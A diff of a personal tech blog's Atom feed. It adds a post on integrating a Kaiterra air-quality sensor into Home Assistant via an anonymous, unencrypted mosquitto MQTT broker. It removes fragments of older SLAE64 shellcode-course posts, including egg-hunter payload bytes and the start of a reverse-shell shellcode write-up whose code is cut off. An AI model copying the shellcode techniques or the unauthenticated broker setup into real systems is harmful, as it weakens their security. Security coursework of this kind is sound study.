@@ -1,5 +1,229 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>limbenjamin</title><link href="https://limbenjamin.com/" rel="alternate"></link><link href="https://limbenjamin.com/feeds/all-en.atom.xml" rel="self"></link><id>https://limbenjamin.com/</id><updated>2026-02-07T10:58:00+08:00</updated><entry><title>Running Caddy on high ports</title><link href="https://limbenjamin.com/articles/running-caddy-on-high-ports.html" rel="alternate"></link><published>2026-02-07T10:58:00+08:00</published><updated>2026-02-07T10:58:00+08:00</updated><author><name>Benjamin Lim</name></author><id>tag:limbenjamin.com,2026-02-07:/articles/running-caddy-on-high-ports.html</id><summary type="html">&lt;p&gt;One of the great selling points of Caddy is seamless SSL setup as Caddy will automatically request certificates from Let's Encrypt. However it uses the HTTP-01 or the TLS-ALPN-01 challenge which requires exposing Caddy on port 80 or 443 during the cert renewal process. This may not be possible as …&lt;/p&gt;</summary><content type="html">&lt;p&gt;One of the great selling points of Caddy is seamless SSL setup as Caddy will automatically request certificates from Let's Encrypt. However it uses the HTTP-01 or the TLS-ALPN-01 challenge which requires exposing Caddy on port 80 or 443 during the cert renewal process. This may not be possible as there could be other services already running on those ports, or there could be a reluctance to expose the service to widespread scanning.&lt;/p&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>limbenjamin</title><link href="https://limbenjamin.com/" rel="alternate"></link><link href="https://limbenjamin.com/feeds/all-en.atom.xml" rel="self"></link><id>https://limbenjamin.com/</id><updated>2026-02-27T18:42:00+08:00</updated><entry><title>Integrate Kaiterra Sensedge Mini with HA</title><link href="https://limbenjamin.com/articles/integrate-kaiterra-sensedege-mini-home-assistant.html" rel="alternate"></link><published>2026-02-27T18:42:00+08:00</published><updated>2026-02-27T18:42:00+08:00</updated><author><name>Benjamin Lim</name></author><id>tag:limbenjamin.com,2026-02-27:/articles/integrate-kaiterra-sensedege-mini-home-assistant.html</id><summary type="html">&lt;p&gt;I've recently come into a Kaiterra Sensedge Mini and spent some time integrating it into my Home Assistant setup. The Kaiterra Sensedge Mini is a commercial grade Air Quality Sensor capable of monitoring CO2, TVOC, PM2.5, PM10, Humidity and Temperature. The easiest route to integrating with Home Assistant is …&lt;/p&gt;</summary><content type="html">&lt;p&gt;I've recently come into a Kaiterra Sensedge Mini and spent some time integrating it into my Home Assistant setup. The Kaiterra Sensedge Mini is a commercial grade Air Quality Sensor capable of monitoring CO2, TVOC, PM2.5, PM10, Humidity and Temperature. The easiest route to integrating with Home Assistant is through MQTT. Since I am using Home Assistant container, I had to run a mosquitto docker container first. Since mosquitto by default on port 1883 does not provide any protocol encryption, it seemed pointless to setup a password, hence I allowed anonymous access&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;table class="highlighttable"&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;&lt;span class="normal"&gt; 1&lt;/span&gt;
+&lt;span class="normal"&gt; 2&lt;/span&gt;
+&lt;span class="normal"&gt; 3&lt;/span&gt;
+&lt;span class="normal"&gt; 4&lt;/span&gt;
+&lt;span class="normal"&gt; 5&lt;/span&gt;
+&lt;span class="normal"&gt; 6&lt;/span&gt;
+&lt;span class="normal"&gt; 7&lt;/span&gt;
+&lt;span class="normal"&gt; 8&lt;/span&gt;
+&lt;span class="normal"&gt; 9&lt;/span&gt;
+&lt;span class="normal"&gt;10&lt;/span&gt;
+&lt;span class="normal"&gt;11&lt;/span&gt;
+&lt;span class="normal"&gt;12&lt;/span&gt;
+&lt;span class="normal"&gt;13&lt;/span&gt;
+&lt;span class="normal"&gt;14&lt;/span&gt;
+&lt;span class="normal"&gt;15&lt;/span&gt;
+&lt;span class="normal"&gt;16&lt;/span&gt;
+&lt;span class="normal"&gt;17&lt;/span&gt;
+&lt;span class="normal"&gt;18&lt;/span&gt;
+&lt;span class="normal"&gt;19&lt;/span&gt;
+&lt;span class="normal"&gt;20&lt;/span&gt;
+&lt;span class="normal"&gt;21&lt;/span&gt;
+&lt;span class="normal"&gt;22&lt;/span&gt;
+&lt;span class="normal"&gt;23&lt;/span&gt;
+&lt;span class="normal"&gt;24&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# cat /mosquitto/config/mosquitto.conf
+persistence true
+persistence_location /mosquitto/data/
+log_dest file /mosquitto/log/mosquitto.log
+
+listener 1883
+## Authentication ##
+allow_anonymous true
+password_file /mosquitto/config/mosquitto.passwd
+
+# create a mosquitto user anyway
+mosquitto_passwd -c /mosquitto/config/pwfile mosquitto
+
+# cat docker-compose.yml
+...
+  mosquitto:
+    image: eclipse-mosquitto
+    network_mode: host
+    volumes:
+      - ./mosquitto/config:/mosquitto/config
+      - ./mosquitto/data:/mosquitto/data
+      - ./mosquitto/log:/mosquitto/log
+...
+# docker compose up -d
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;
+
+&lt;p&gt;After mosquitto is running, it was time to setup the Sensedge Mini. At this point, you will want to download the Kaiterra Enterprise Configuration Tool from their website. Insert the modules and power it up, it will start advertising a network with "Kaiterra" in the name. I had good results with the Windows version and the Android apk and struggled with the Linux one. Do not download from Google Play, the version on Google Play requires a Kaiterra account and there is no way to create one. You will only be given a Kaiterra account if you purchased it from an authorized channel. After connecting to the Wifi network and starting the tool, you will enter the configuration page where you can setup the WiFi network to connect to as well as the MQTT server IP address and credentials. At this point, it is important to note down the udid, or you would have to reconnect to it again. If you did the setup correctly, you would see the device connecting on the MQTT server logs&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;table class="highlighttable"&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;&lt;span class="normal"&gt;1&lt;/span&gt;
+&lt;span class="normal"&gt;2&lt;/span&gt;
+&lt;span class="normal"&gt;3&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;cat mosquitto.log
+1772187934: Client Kaiterra-SE-200-ffffff [(null):0] disconnected: session taken over.
+1772187934: New client connected from 192.168.10.111:62758 as Kaiterra-SE-200-fffff (p4, c0, k60).
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;
+
+&lt;p&gt;Now, we shift our focus to Home Assistant, you will need to Add integration, select MQTT and set it up with the IP address and credentials. Once that is done, the easiest way is to setup the sensors by adding the following lines to configuration.yaml and restarting Home Assistant.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;table class="highlighttable"&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;&lt;span class="normal"&gt; 1&lt;/span&gt;
+&lt;span class="normal"&gt; 2&lt;/span&gt;
+&lt;span class="normal"&gt; 3&lt;/span&gt;
+&lt;span class="normal"&gt; 4&lt;/span&gt;
+&lt;span class="normal"&gt; 5&lt;/span&gt;
+&lt;span class="normal"&gt; 6&lt;/span&gt;
+&lt;span class="normal"&gt; 7&lt;/span&gt;
+&lt;span class="normal"&gt; 8&lt;/span&gt;
+&lt;span class="normal"&gt; 9&lt;/span&gt;
+&lt;span class="normal"&gt;10&lt;/span&gt;
+&lt;span class="normal"&gt;11&lt;/span&gt;
+&lt;span class="normal"&gt;12&lt;/span&gt;
+&lt;span class="normal"&gt;13&lt;/span&gt;
+&lt;span class="normal"&gt;14&lt;/span&gt;
+&lt;span class="normal"&gt;15&lt;/span&gt;
+&lt;span class="normal"&gt;16&lt;/span&gt;
+&lt;span class="normal"&gt;17&lt;/span&gt;
+&lt;span class="normal"&gt;18&lt;/span&gt;
+&lt;span class="normal"&gt;19&lt;/span&gt;
+&lt;span class="normal"&gt;20&lt;/span&gt;
+&lt;span class="normal"&gt;21&lt;/span&gt;
+&lt;span class="normal"&gt;22&lt;/span&gt;
+&lt;span class="normal"&gt;23&lt;/span&gt;
+&lt;span class="normal"&gt;24&lt;/span&gt;
+&lt;span class="normal"&gt;25&lt;/span&gt;
+&lt;span class="normal"&gt;26&lt;/span&gt;
+&lt;span class="normal"&gt;27&lt;/span&gt;
+&lt;span class="normal"&gt;28&lt;/span&gt;
+&lt;span class="normal"&gt;29&lt;/span&gt;
+&lt;span class="normal"&gt;30&lt;/span&gt;
+&lt;span class="normal"&gt;31&lt;/span&gt;
+&lt;span class="normal"&gt;32&lt;/span&gt;
+&lt;span class="normal"&gt;33&lt;/span&gt;
+&lt;span class="normal"&gt;34&lt;/span&gt;
+&lt;span class="normal"&gt;35&lt;/span&gt;
+&lt;span class="normal"&gt;36&lt;/span&gt;
+&lt;span class="normal"&gt;37&lt;/span&gt;
+&lt;span class="normal"&gt;38&lt;/span&gt;
+&lt;span class="normal"&gt;39&lt;/span&gt;
+&lt;span class="normal"&gt;40&lt;/span&gt;
+&lt;span class="normal"&gt;41&lt;/span&gt;
+&lt;span class="normal"&gt;42&lt;/span&gt;
+&lt;span class="normal"&gt;43&lt;/span&gt;
+&lt;span class="normal"&gt;44&lt;/span&gt;
+&lt;span class="normal"&gt;45&lt;/span&gt;
+&lt;span class="normal"&gt;46&lt;/span&gt;
+&lt;span class="normal"&gt;47&lt;/span&gt;
+&lt;span class="normal"&gt;48&lt;/span&gt;
+&lt;span class="normal"&gt;49&lt;/span&gt;
+&lt;span class="normal"&gt;50&lt;/span&gt;
+&lt;span class="normal"&gt;51&lt;/span&gt;
+&lt;span class="normal"&gt;52&lt;/span&gt;
+&lt;span class="normal"&gt;53&lt;/span&gt;
+&lt;span class="normal"&gt;54&lt;/span&gt;
+&lt;span class="normal"&gt;55&lt;/span&gt;
+&lt;span class="normal"&gt;56&lt;/span&gt;
+&lt;span class="normal"&gt;57&lt;/span&gt;
+&lt;span class="normal"&gt;58&lt;/span&gt;
+&lt;span class="normal"&gt;59&lt;/span&gt;
+&lt;span class="normal"&gt;60&lt;/span&gt;
+&lt;span class="normal"&gt;61&lt;/span&gt;
+&lt;span class="normal"&gt;62&lt;/span&gt;
+&lt;span class="normal"&gt;63&lt;/span&gt;
+&lt;span class="normal"&gt;64&lt;/span&gt;
+&lt;span class="normal"&gt;65&lt;/span&gt;
+&lt;span class="normal"&gt;66&lt;/span&gt;
+&lt;span class="normal"&gt;67&lt;/span&gt;
+&lt;span class="normal"&gt;68&lt;/span&gt;
+&lt;span class="normal"&gt;69&lt;/span&gt;
+&lt;span class="normal"&gt;70&lt;/span&gt;
+&lt;span class="normal"&gt;71&lt;/span&gt;
+&lt;span class="normal"&gt;72&lt;/span&gt;
+&lt;span class="normal"&gt;73&lt;/span&gt;
+&lt;span class="normal"&gt;74&lt;/span&gt;
+&lt;span class="normal"&gt;75&lt;/span&gt;
+&lt;span class="normal"&gt;76&lt;/span&gt;
+&lt;span class="normal"&gt;77&lt;/span&gt;
+&lt;span class="normal"&gt;78&lt;/span&gt;
+&lt;span class="normal"&gt;79&lt;/span&gt;
+&lt;span class="normal"&gt;80&lt;/span&gt;
+&lt;span class="normal"&gt;81&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;mqtt:
+  sensor:
+
+    # 🌡 Temperature
+    - name: &amp;quot;Kaiterra Temperature&amp;quot;
+      unique_id: kaiterra_temp_0fffffff
+      state_topic: &amp;quot;kaiterra/device/history/udid-here&amp;quot;
+      value_template: &amp;quot;{{ value_json.data.rtemp }}&amp;quot;
+      unit_of_measurement: &amp;quot;°C&amp;quot;
+      device_class: temperature
+      state_class: measurement
+      device:
+        identifiers: [&amp;quot;kaiterra_0fffffff&amp;quot;]
+        name: &amp;quot;Kaiterra Air Monitor&amp;quot;
+        manufacturer: &amp;quot;Kaiterra&amp;quot;
+        model: &amp;quot;VG21D21021&amp;quot;
+
+    # 💧 Humidity
+    - name: &amp;quot;Kaiterra Humidity&amp;quot;
+      unique_id: kaiterra_humidity_0fffffff
+      state_topic: &amp;quot;kaiterra/device/history/udid-here&amp;quot;
+      value_template: &amp;quot;{{ value_json.data.rhumid }}&amp;quot;
+      unit_of_measurement: &amp;quot;%&amp;quot;
+      device_class: humidity
+      state_class: measurement
+      device:
+        identifiers: [&amp;quot;kaiterra_0fffffff&amp;quot;]
+
+    # 🫁 CO2
+    - name: &amp;quot;Kaiterra CO2&amp;quot;
+      unique_id: kaiterra_co2_0fffffff
+      state_topic: &amp;quot;kaiterra/device/history/udid-here&amp;quot;
+      value_template: &amp;quot;{{ value_json.data[&amp;#39;rco2 (ppm)&amp;#39;] }}&amp;quot;
+      unit_of_measurement: &amp;quot;ppm&amp;quot;
+      device_class: carbon_dioxide
+      state_class: measurement
+      device:
+        identifiers: [&amp;quot;kaiterra_0fffffff&amp;quot;]
+
+    # 🌫 PM2.5
+    - name: &amp;quot;Kaiterra PM2.5&amp;quot;
+      unique_id: kaiterra_pm25_0fffffff
+      state_topic: &amp;quot;kaiterra/device/history/udid-here&amp;quot;
+      value_template: &amp;quot;{{ value_json.data[&amp;#39;km200.rpm25&amp;#39;] }}&amp;quot;
+      unit_of_measurement: &amp;quot;µg/m³&amp;quot;
+      device_class: pm25
+      state_class: measurement
+      device:
+        identifiers: [&amp;quot;kaiterra_0fffffff&amp;quot;]
+
+    # 🌪 PM10
+    - name: &amp;quot;Kaiterra PM10&amp;quot;
+      unique_id: kaiterra_pm10_0fffffff
+      state_topic: &amp;quot;kaiterra/device/history/udid-here&amp;quot;
+      value_template: &amp;quot;{{ value_json.data[&amp;#39;km200.rpm10&amp;#39;] }}&amp;quot;
+      unit_of_measurement: &amp;quot;µg/m³&amp;quot;
+      device_class: pm10
+      state_class: measurement
+      device:
+        identifiers: [&amp;quot;kaiterra_0fffffff&amp;quot;]
+
+    # 🧪 TVOC
+    - name: &amp;quot;Kaiterra TVOC&amp;quot;
+      unique_id: kaiterra_tvoc_0fffffff
+      state_topic: &amp;quot;kaiterra/device/history/udid-here&amp;quot;
+      value_template: &amp;quot;{{ value_json.data[&amp;#39;km203.rtvoc (ppb)&amp;#39;] }}&amp;quot;
+      unit_of_measurement: &amp;quot;ppb&amp;quot;
+      state_class: measurement
+      device:
+        identifiers: [&amp;quot;kaiterra_0fffffff&amp;quot;]
+
+    # 📶 WiFi Signal
+    - name: &amp;quot;Kaiterra Signal Strength&amp;quot;
+      unique_id: kaiterra_signal_0fffffff
+      state_topic: &amp;quot;kaiterra/device/history/udid-here&amp;quot;
+      value_template: &amp;quot;{{ value_json.data.signal_strength }}&amp;quot;
+      unit_of_measurement: &amp;quot;dBm&amp;quot;
+      device_class: signal_strength
+      state_class: measurement
+      device:
+        identifiers: [&amp;quot;kaiterra_0fffffff&amp;quot;]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;
+
+&lt;p&gt;Enjoy.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="image" src="//limbenjamin.com/media/kaiterra.jpeg"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="image" src="//limbenjamin.com/media/kaiterra2.jpeg"&gt;&lt;/p&gt;</content><category term="articles"></category><category term="Server"></category></entry><entry><title>Running Caddy on high ports</title><link href="https://limbenjamin.com/articles/running-caddy-on-high-ports.html" rel="alternate"></link><published>2026-02-07T10:58:00+08:00</published><updated>2026-02-07T10:58:00+08:00</updated><author><name>Benjamin Lim</name></author><id>tag:limbenjamin.com,2026-02-07:/articles/running-caddy-on-high-ports.html</id><summary type="html">&lt;p&gt;One of the great selling points of Caddy is seamless SSL setup as Caddy will automatically request certificates from Let's Encrypt. However it uses the HTTP-01 or the TLS-ALPN-01 challenge which requires exposing Caddy on port 80 or 443 during the cert renewal process. This may not be possible as …&lt;/p&gt;</summary><content type="html">&lt;p&gt;One of the great selling points of Caddy is seamless SSL setup as Caddy will automatically request certificates from Let's Encrypt. However it uses the HTTP-01 or the TLS-ALPN-01 challenge which requires exposing Caddy on port 80 or 443 during the cert renewal process. This may not be possible as there could be other services already running on those ports, or there could be a reluctance to expose the service to widespread scanning.&lt;/p&gt;
 &lt;p&gt;After some finicking around, I managed to build Caddy with the dns.providers.cloudflare module and set it up to use the DNS-01 challenge which eliminates the need to use port 80 or 443.&lt;/p&gt;
 &lt;p&gt;The first step is to install xcaddy, create a Dockerfile with the required plugins and build it. I chose to name the image custom-caddy.  &lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;table class="highlighttable"&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;&lt;span class="normal"&gt; 1&lt;/span&gt;
@@ -4607,231 +4831,6 @@ crc32(0x3ea) =  0x47022e8d
 &lt;span class="k"&gt;section&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;.data&lt;/span&gt;
 &lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nl"&gt;_padding:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kd"&gt;db&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x90&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x90&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x90&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="c1"&gt;; padding to align egg to 4 byte boundary&lt;/span&gt;
 &lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nl"&gt;_egg:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kd"&gt;db&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x90&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x50&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x90&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x50&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x48&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x31&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0xc9&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x48&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0xf7&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0xe1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x50&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x5f&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0xff&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0xc0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x48&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x83&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0xc2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x08&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x68&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x4f&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x4b&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x20&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x0a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x48&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x89&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0xe6&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x0f&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x05&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x6a&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x3c&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x58&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x0f&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x05&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;
-
-&lt;p&gt;This blog post has (not) been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:&lt;/p&gt;
-&lt;p&gt;Student ID: SLAE64-XXXXX&lt;/p&gt;</content><category term="articles"></category><category term="Security"></category></entry><entry><title>SLAE64 #2 - Revshell TCP shellcode</title><link href="https://limbenjamin.com/articles/slae64-2-revshell-tcp-shellcode.html" rel="alternate"></link><published>2019-05-17T22:45:00+08:00</published><updated>2019-05-17T22:45:00+08:00</updated><author><name>Benjamin Lim</name></author><id>tag:limbenjamin.com,2019-05-17:/articles/slae64-2-revshell-tcp-shellcode.html</id><summary type="html">&lt;p&gt;This shellcode is very similar to the &lt;a href="//limbenjamin.com/articles/slae64-1-bindshell-tcp-shellcode.html"&gt;Bindshell TCP shellcode&lt;/a&gt;, so please refer to it for the unique and interesting points. There is only 1 additional point I would like to make:&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;Line 8/37: Listen on 127.1.1.1 instead of 127.0.0.1. This saves us …&lt;/li&gt;&lt;/ol&gt;</summary><content type="html">&lt;p&gt;This shellcode is very similar to the &lt;a href="//limbenjamin.com/articles/slae64-1-bindshell-tcp-shellcode.html"&gt;Bindshell TCP shellcode&lt;/a&gt;, so please refer to it for the unique and interesting points. There is only 1 additional point I would like to make:&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;Line 8/37: Listen on 127.1.1.1 instead of 127.0.0.1. This saves us from having to nullify the 2 bytes in the middle.&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;Total size: 122 bytes&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;table class="highlighttable"&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;&lt;span class="normal"&gt;  1&lt;/span&gt;
-&lt;span class="normal"&gt;  2&lt;/span&gt;
-&lt;span class="normal"&gt;  3&lt;/span&gt;
-&lt;span class="normal"&gt;  4&lt;/span&gt;
-&lt;span class="normal"&gt;  5&lt;/span&gt;
-&lt;span class="normal"&gt;  6&lt;/span&gt;
-&lt;span class="normal"&gt;  7&lt;/span&gt;
-&lt;span class="normal"&gt;  8&lt;/span&gt;
-&lt;span class="normal"&gt;  9&lt;/span&gt;
-&lt;span class="normal"&gt; 10&lt;/span&gt;
-&lt;span class="normal"&gt; 11&lt;/span&gt;
-&lt;span class="normal"&gt; 12&lt;/span&gt;
-&lt;span class="normal"&gt; 13&lt;/span&gt;
-&lt;span class="normal"&gt; 14&lt;/span&gt;
-&lt;span class="normal"&gt; 15&lt;/span&gt;
-&lt;span class="normal"&gt; 16&lt;/span&gt;
-&lt;span class="normal"&gt; 17&lt;/span&gt;
-&lt;span class="normal"&gt; 18&lt;/span&gt;
-&lt;span class="normal"&gt; 19&lt;/span&gt;
-&lt;span class="normal"&gt; 20&lt;/span&gt;
-&lt;span class="normal"&gt; 21&lt;/span&gt;
-&lt;span class="normal"&gt; 22&lt;/span&gt;
-&lt;span class="normal"&gt; 23&lt;/span&gt;
-&lt;span class="normal"&gt; 24&lt;/span&gt;
-&lt;span class="normal"&gt; 25&lt;/span&gt;
-&lt;span class="normal"&gt; 26&lt;/span&gt;
-&lt;span class="normal"&gt; 27&lt;/span&gt;
-&lt;span class="normal"&gt; 28&lt;/span&gt;
-&lt;span class="normal"&gt; 29&lt;/span&gt;
-&lt;span class="normal"&gt; 30&lt;/span&gt;
-&lt;span class="normal"&gt; 31&lt;/span&gt;
-&lt;span class="normal"&gt; 32&lt;/span&gt;
-&lt;span class="normal"&gt; 33&lt;/span&gt;
-&lt;span class="normal"&gt; 34&lt;/span&gt;
-&lt;span class="normal"&gt; 35&lt;/span&gt;
-&lt;span class="normal"&gt; 36&lt;/span&gt;
-&lt;span class="normal"&gt; 37&lt;/span&gt;
-&lt;span class="normal"&gt; 38&lt;/span&gt;
-&lt;span class="normal"&gt; 39&lt;/span&gt;
-&lt;span class="normal"&gt; 40&lt;/span&gt;
-&lt;span class="normal"&gt; 41&lt;/span&gt;
-&lt;span class="normal"&gt; 42&lt;/span&gt;
-&lt;span class="normal"&gt; 43&lt;/span&gt;
-&lt;span class="normal"&gt; 44&lt;/span&gt;
-&lt;span class="normal"&gt; 45&lt;/span&gt;
-&lt;span class="normal"&gt; 46&lt;/span&gt;
-&lt;span class="normal"&gt; 47&lt;/span&gt;
-&lt;span class="normal"&gt; 48&lt;/span&gt;
-&lt;span class="normal"&gt; 49&lt;/span&gt;
-&lt;span class="normal"&gt; 50&lt;/span&gt;
-&lt;span class="normal"&gt; 51&lt;/span&gt;
-&lt;span class="normal"&gt; 52&lt;/span&gt;
-&lt;span class="normal"&gt; 53&lt;/span&gt;
-&lt;span class="normal"&gt; 54&lt;/span&gt;
-&lt;span class="normal"&gt; 55&lt;/span&gt;
-&lt;span class="normal"&gt; 56&lt;/span&gt;
-&lt;span class="normal"&gt; 57&lt;/span&gt;
-&lt;span class="normal"&gt; 58&lt;/span&gt;
-&lt;span class="normal"&gt; 59&lt;/span&gt;
-&lt;span class="normal"&gt; 60&lt;/span&gt;
-&lt;span class="normal"&gt; 61&lt;/span&gt;
-&lt;span class="normal"&gt; 62&lt;/span&gt;
-&lt;span class="normal"&gt; 63&lt;/span&gt;
-&lt;span class="normal"&gt; 64&lt;/span&gt;
-&lt;span class="normal"&gt; 65&lt;/span&gt;
-&lt;span class="normal"&gt; 66&lt;/span&gt;
-&lt;span class="normal"&gt; 67&lt;/span&gt;
-&lt;span class="normal"&gt; 68&lt;/span&gt;
-&lt;span class="normal"&gt; 69&lt;/span&gt;
-&lt;span class="normal"&gt; 70&lt;/span&gt;
-&lt;span class="normal"&gt; 71&lt;/span&gt;
-&lt;span class="normal"&gt; 72&lt;/span&gt;
-&lt;span class="normal"&gt; 73&lt;/span&gt;
-&lt;span class="normal"&gt; 74&lt;/span&gt;
-&lt;span class="normal"&gt; 75&lt;/span&gt;
-&lt;span class="normal"&gt; 76&lt;/span&gt;
-&lt;span class="normal"&gt; 77&lt;/span&gt;
-&lt;span class="normal"&gt; 78&lt;/span&gt;
-&lt;span class="normal"&gt; 79&lt;/span&gt;
-&lt;span class="normal"&gt; 80&lt;/span&gt;
-&lt;span class="normal"&gt; 81&lt;/span&gt;
-&lt;span class="normal"&gt; 82&lt;/span&gt;
-&lt;span class="normal"&gt; 83&lt;/span&gt;
-&lt;span class="normal"&gt; 84&lt;/span&gt;
-&lt;span class="normal"&gt; 85&lt;/span&gt;
-&lt;span class="normal"&gt; 86&lt;/span&gt;
-&lt;span class="normal"&gt; 87&lt;/span&gt;
-&lt;span class="normal"&gt; 88&lt;/span&gt;
